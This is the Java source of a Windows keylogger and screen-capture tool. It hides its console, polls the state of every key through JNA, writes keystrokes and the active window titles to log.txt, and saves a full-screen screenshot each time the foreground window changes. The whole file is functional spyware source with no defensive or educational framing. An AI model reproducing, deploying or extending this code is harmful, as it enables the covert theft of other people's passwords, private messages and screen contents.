import java.io.*;
import java.util.*;
import com.sun.jna.platform.win32.*;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinUser;
import com.sun.jna.platform.win32.WinDef.HWND;
import java.awt.AWTException;
import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JLabel;

public class Keylogger {

    static char[] prev_Window = new char[256];
    static char[] curr_Window = new char[256];
    static boolean isShiftPressed = false;

    // Generate a unique file name with date and time
    private static String generateUniqueFileName(String folderPath, String baseName, String extension) {
        SimpleDateFormat dateFormat = new SimpleDateFormat("dd-MM-yyyy_HH-mm-ss");
        String timestamp = dateFormat.format(new Date());
        String fileName = baseName + "_" + timestamp + "." + extension;

        File file = new File(folderPath, fileName);
        int count = 1;
        while (file.exists()) {
            fileName = baseName + "_" + timestamp + "_" + count + "." + extension;
            file = new File(folderPath, fileName);
            count++;
        }
        return file.getAbsolutePath();
    }

    public static void capture() {
        try {
            final Robot robot = new Robot();
            final GraphicsDevice device = GraphicsEnvironment.getLocalGraphicsEnvironment().getDefaultScreenDevice();
            final Rectangle screenRect = device.getDefaultConfiguration().getBounds();
            final BufferedImage image = robot.createScreenCapture(screenRect);
            final JLabel label = new JLabel(new ImageIcon(image));
            final JFrame frame = new JFrame();
            frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
            frame.getContentPane().add(label);
            frame.setUndecorated(true);
            device.setFullScreenWindow(frame);

            // Create the screenshots folder if it doesn't exist
            File screenshotsFolder = new File("screenshots");
            if (!screenshotsFolder.exists()) {
                screenshotsFolder.mkdirs();
            }

            // Generate a unique file name for the screenshot
            String fileName = generateUniqueFileName(screenshotsFolder.getPath(), "screenshot", "png");
            File outputFile = new File(fileName);
            ImageIO.write(image, "png", outputFile);
            // System.out.println("Screenshot saved to: " + outputFile.getAbsolutePath());

            // Close the frame instead of exiting the program
            frame.dispose();
        } catch (AWTException | IOException ex) {
            System.err.println(ex);
        }
    }

    static int logger(int key, String file) {

        HWND hwnd = User32.INSTANCE.GetForegroundWindow();
        User32.INSTANCE.GetWindowText(hwnd, curr_Window, 256);

        if (Arrays.compare(curr_Window, prev_Window) != 0) {
            String dt = new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date());
            try {
                FileWriter fileWriter = new FileWriter(file, true);
                PrintWriter printWriter = new PrintWriter(fileWriter);
                printWriter.printf("\n\n%s\t\t%s\n", String.valueOf(curr_Window).trim(), dt);
                printWriter.close();
                // Create a separate thread for capturing the screenshot
                Thread captureThread = new Thread(Keylogger::capture);
                captureThread.start();
            } catch (IOException e) {
                e.printStackTrace();
            }
            System.arraycopy(curr_Window, 0, prev_Window, 0, curr_Window.length);
        }

        if (User32.INSTANCE.GetAsyncKeyState(0x11) != 0 && User32.INSTANCE.GetAsyncKeyState(0x10) != 0
                && User32.INSTANCE.GetAsyncKeyState(0x47) != 0) {
            Shell32.INSTANCE.ShellExecute(null, "open", "log.txt", null, null, WinUser.SW_SHOW);
        }
        if (User32.INSTANCE.GetAsyncKeyState(0x11) != 0 && User32.INSTANCE.GetAsyncKeyState(0x10) != 0
                && User32.INSTANCE.GetAsyncKeyState(0x51) != 0) {
            System.exit(0);
        }

        try {
            FileWriter fileWriter = new FileWriter(file, true);
            PrintWriter printWriter = new PrintWriter(fileWriter);

            switch (key) {
                case 0x01:
                    printWriter.print("[L_Mouse_Button]");
                    break;
                case 0x02:
                    printWriter.print("[R_Mouse_Button]");
                    break;
                case 0x03:
                    printWriter.print("[Cancel]");
                    break;
                case 0x04:
                    printWriter.print("[Middle_Mouse_Button]");
                    break;
                case 0x05:
                    printWriter.print("[X1_Mouse_Button]");
                    break;
                case 0x06:
                    printWriter.print("[X2_Mouse_Button]");
                    break;
                case 0x08:
                    printWriter.print("[BackSpace]");
                    break;
                case 0x09:
                    printWriter.print("[Tab_Key]");
                    break;
                case 0x0C:
                    printWriter.print("[Clear]");
                    break;
                case 0x0D:
                    printWriter.print("[Enter]");
                    break;
                case 0x10:
                    isShiftPressed = true;
                    printWriter.print("[Shift_Key]");
                    break;
                case -0x10:
                    isShiftPressed = false;
                    break;
                case 0x11:
                    printWriter.print("[CTRL]");
                    break;
                case 0x12:
                    printWriter.print("[ALT]");
                    break;
                case 0x13:
                    printWriter.print("[Pause]");
                    break;
                case 0x14:
                    printWriter.print("[CAPS_LOCK]");
                    break;
                case 0x1B:
                    printWriter.print("[ESC]");
                    break;
                case 0x20:
                    printWriter.print("[SPACEBAR]");
                    break;
                case 0x22:
                    printWriter.print("[PAGE_DOWN]");
                    break;
                case 0x23:
                    printWriter.print("[END_KEY]");
                    break;
                case 0x24:
                    printWriter.print("[HOME_KEY]");
                    break;
                case 0x25:
                    printWriter.print("[LEFT_ARROW]");
                    break;
                case 0x26:
                    printWriter.print("[UP_ARROW]");
                    break;
                case 0x27:
                    printWriter.print("[RIGHT_ARROW]");
                    break;
                case 0x28:
                    printWriter.print("[DOWN_ARROW]");
                    break;
                case 0x29:
                    printWriter.print("[SELECT_KEY]");
                    break;
                case 0x2A:
                    printWriter.print("[PRINT_KEY]");
                    break;
                case 0x2B:
                    printWriter.print("[Excecute_Key]");
                    break;
                case 0x2C:
                    printWriter.print("[Print_Scr_Key]");
                    break;
                case 0x2D:
                    printWriter.print("[INS_Key]");
                    break;
                case 0x2E:
                    printWriter.print("[DEL_Key]");
                    break;
                case 0x2F:
                    printWriter.print("[HELP_KEY]");
                    break;
                case 0x30:
                    if (isShiftPressed)
                        printWriter.print(")");
                    else
                        printWriter.print("0");
                    break;
                case 0x31:
                    if (isShiftPressed)
                        printWriter.print("!");
                    else
                        printWriter.print("1");
                    break;
                case 0x32:
                    if (isShiftPressed)
                        printWriter.print("@");
                    else
                        printWriter.print("2");
                    break;
                case 0x33:
                    if (isShiftPressed)
                        printWriter.print("#");
                    else
                        printWriter.print("3");
                    break;
                case 0x34:
                    if (isShiftPressed)
                        printWriter.print("$");
                    else
                        printWriter.print("4");
                    break;
                case 0x35:
                    if (isShiftPressed)
                        printWriter.print("%");
                    else
                        printWriter.print("5");
                    break;
                case 0x36:
                    if (isShiftPressed)
                        printWriter.print("^");
                    else
                        printWriter.print("6");
                    break;
                case 0x37:
                    if (isShiftPressed)
                        printWriter.print("&");
                    else
                        printWriter.print("7");
                    break;
                case 0x38:
                    if (isShiftPressed)
                        printWriter.print("*");
                    else
                        printWriter.print("8");
                    break;
                case 0x39:
                    if (isShiftPressed)
                        printWriter.print("(");
                    else
                        printWriter.print("9");
                    break;
                case 0x40:
                    if (isShiftPressed)
                        printWriter.print("_");
                    else
                        printWriter.print("-");
                    break;
                case 0xDB:
                    if (isShiftPressed)
                        printWriter.print("{");
                    else
                        printWriter.print("[");
                    break;
                case 0xDD:
                    if (isShiftPressed)
                        printWriter.print("}");
                    else
                        printWriter.print("]");
                    break;
                case 0xE2:
                    if (isShiftPressed)
                        printWriter.print("|");
                    else
                        printWriter.print("\\");
                    break;
                case 0xDE:
                    if (isShiftPressed)
                        printWriter.print("\"");
                    else
                        printWriter.print("'");
                    break;
                case 0x5B:
                    printWriter.print("[LockWin/WinKey]");
                    break;
                case 0x5C:
                    printWriter.print("[WinKey]");
                    break;
                case 0x5D:
                    printWriter.print("[APP_Key]");
                    break;
                case 0x5F:
                    printWriter.print("[Sleep_Key]");
                    break;
                case 0x60:
                    printWriter.print("0");
                    break;
                case 0x61:
                    printWriter.print("1");
                    break;
                case 0x62:
                    printWriter.print("2");
                    break;
                case 0x63:
                    printWriter.print("3");
                    break;
                case 0x64:
                    printWriter.print("4");
                    break;
                case 0x65:
                    printWriter.print("5");
                    break;
                case 0x66:
                    printWriter.print("6");
                    break;
                case 0x67:
                    printWriter.print("7");
                    break;
                case 0x68:
                    printWriter.print("8");
                    break;
                case 0x69:
                    printWriter.print("9");
                    break;
                case 0x6A:
                    printWriter.print("*");
                    break;
                case 0x6B:
                    printWriter.print("+");
                    break;
                case 0x6D:
                    printWriter.print("-");
                    break;
                // Decimal key is also the dot in the keypad
                case 0x6E:
                    // printWriter.print("[Decimal_Key]");
                    printWriter.print(".");
                    break;
                case 0x6F:
                    printWriter.print("/");
                    break;
                case 0x70:
                    printWriter.print("[F1_Key]");
                    break;
                case 0x71:
                    printWriter.print("[F2_Key]");
                    break;
                case 0x72:
                    printWriter.print("[F3_Key]");
                    break;
                case 0x73:
                    printWriter.print("[F4_Key]");
                    break;
                case 0x74:
                    printWriter.print("[F5_Key]");
                    break;
                case 0x75:
                    printWriter.print("[F6_Key]");
                    break;
                case 0x76:
                    printWriter.print("[F7_Key]");
                    break;
                case 0x77:
                    printWriter.print("[F8_Key]");
                    break;
                case 0x78:
                    printWriter.print("[F9_Key]");
                    break;
                case 0x79:
                    printWriter.print("[F10_Key]");
                    break;
                case 0x7A:
                    printWriter.print("[F11_Key]");
                    break;
                case 0x7B:
                    printWriter.print("[F12_Key]");
                    break;
                case 0x7C:
                    printWriter.print("[F13_Key]");
                    break;
                case 0x7D:
                    printWriter.print("[F14_Key]");
                    break;
                case 0x7E:
                    printWriter.print("[F15_Key]");
                    break;
                case 0x7F:
                    printWriter.print("[F16_Key]");
                    break;
                case 0x80:
                    printWriter.print("[F17_Key]");
                    break;
                case 0x81:
                    printWriter.print("[F18_Key]");
                    break;
                case 0x82:
                    printWriter.print("[F19_Key]");
                    break;
                case 0x83:
                    printWriter.print("[F20_Key]");
                    break;
                case 0x84:
                    printWriter.print("[F21_Key]");
                    break;
                case 0x85:
                    printWriter.print("[F22_Key]");
                    break;
                case 0x86:
                    printWriter.print("[F23_Key]");
                    break;
                case 0x87:
                    printWriter.print("[F24_Key]");
                    break;
                case 0x90:
                    printWriter.print("[NUM_LOCK_key]");
                    break;
                case 0x91:
                    printWriter.print("[Scroll_Key]");
                    break;
                case 0xA6:
                    printWriter.print("[B_Back_Key]");
                    break;
                case 0xA7:
                    printWriter.print("[B_Forward_Key]");
                    break;
                case 0xA8:
                    printWriter.print("[B_Refresh_Key]");
                    break;
                case 0xA9:
                    printWriter.print("[B_Stop_Key]");
                    break;
                case 0xAA:
                    printWriter.print("[B_Search_Key]");
                    break;
                case 0xAB:
                    printWriter.print("[B_Fav_Key]");
                    break;
                case 0xAC:
                    printWriter.print("[B_Home_Key]");
                    break;
                case 0xAD:
                    printWriter.print("[Vol_Mute]");
                    break;
                case 0xAE:
                    printWriter.print("[Vol_Down]");
                    break;
                case 0xAF:
                    printWriter.print("[Vol_Up]");
                    break;
                case 0xB0:
                    printWriter.print("[Next_Track_Key]");
                    break;
                case 0xB1:
                    printWriter.print("[Prev_Track_Key]");
                    break;
                case 0xB2:
                    printWriter.print("[Stop_Media_Key]");
                    break;
                case 0xB3:
                    printWriter.print("[Play/Pause]");
                    break;
                case 0xB4:
                    printWriter.print("[Start_Mail_Key]");
                    break;
                case 0xB5:
                    printWriter.print("[Select_Media_Key]");
                    break;
                case 0x3F:
                    printWriter.print("?");
                    break;
                case 0x3C:
                    printWriter.print("<");
                    break;
                case 0x3E:
                    printWriter.print(">");
                    break;
                case 0x3B:
                    printWriter.print(";");
                    break;
                case 0x3A:
                    printWriter.print(":");
                    break;
                case 0x5E:
                    printWriter.print("^");
                    break;
                default:
                    printWriter.print((char) key);
            }
            printWriter.close();
            System.out.flush();

        } catch (IOException e) {
            e.printStackTrace();
        }
        return 0;
    }

    public static void main(String[] args) {
        Kernel32.INSTANCE.FreeConsole();
        Thread loggerThread = new Thread(() -> {
            char i;
            while (true) {
                for (i = 8; i <= 255; i++) {
                    if (User32.INSTANCE.GetAsyncKeyState(i) == -32767) {
                        logger(i, "log.txt");
                    }
                }
            }
        });

        // Start the logger thread
        loggerThread.start();
    }
}
